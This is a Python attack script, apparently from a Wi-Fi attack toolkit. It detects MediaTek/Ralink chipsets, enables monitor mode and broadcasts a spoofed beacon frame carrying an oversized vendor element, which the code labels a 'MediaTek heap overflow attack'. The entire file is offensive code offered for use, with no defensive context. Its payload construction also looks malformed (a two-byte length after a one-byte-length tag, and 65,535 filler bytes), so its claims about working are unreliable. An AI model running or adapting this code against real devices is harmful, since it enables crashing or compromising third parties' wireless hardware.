#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import subprocess
from utils.hardware import interface, monitor_interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.logger import log_capture
from utils.status import print_status


def get_chipset() -> str:
    """Detect MediaTek chipset."""
    try:
        result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
        if 'MediaTek' in result.stdout or 'Ralink' in result.stdout:
            return 'mediatek'
        result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
        if 'MediaTek' in result.stdout or 'Ralink' in result.stdout:
            return 'mediatek'
    except:
        pass
    return 'unknown'


def mediatek_heap_overflow(bssid: str, channel: str = "1", session_id: str = None) -> bool:
    """
    MediaTek heap overflow attack – sends oversized beacon frame.
    """
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    chip = get_chipset()
    if chip != 'mediatek':
        print_status("MediaTek chipset not detected – attack may not work", "warning")

    print_status(f"MediaTek heap overflow: {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    beacon = scapy.RadioTap() / scapy.Dot11(
        type=0, subtype=8,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid
    ) / scapy.Dot11Beacon()
    overflow_ie = b'\xdd' + b'\xff\xff' + b'\x41' * 65535
    pkt = beacon / overflow_ie
    scapy.sendp(pkt, iface=mon_iface, count=1, inter=0.1)

    log_capture("mediatek_overflow", bssid, "", None)
    print_status("Heap overflow frame sent", "success")
    return True
